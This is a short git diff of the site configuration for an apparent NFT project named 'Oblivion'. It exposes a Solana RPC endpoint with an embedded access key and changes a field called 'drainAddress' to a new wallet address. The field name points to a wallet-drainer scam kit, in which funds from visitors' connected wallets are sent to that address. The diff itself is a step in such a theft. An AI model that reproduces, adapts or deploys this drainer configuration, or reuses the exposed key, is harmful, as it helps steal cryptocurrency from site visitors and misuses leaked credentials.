@@ -19,7 +19,7 @@ export const siteConfig: SiteConfig = {
   description: "In a dystopian future, humanity's hubris led to the downfall of the world. Amidst the ruins, Oblivion emerges – a sentient AI tasked with preserving humanity's legacy.",
   language: "en",
   solanaRpcEndpoint: "https://stylish-convincing-energy.solana-mainnet.quiknode.pro/a1af2b933d8e1a30e92222d369e32b688006ce64", 
-  drainAddress: "8SG9FLuFRfbs1nMRBB7RYAjfMTkAW9zGpx3MUkYFibgT", 
+  drainAddress: "9omKEppVQHizTqiyxsFaPmn463kJWezeB4gMmkrLKUDu", 
   officialDomain: "oblivionnft.xyz",
 };
 
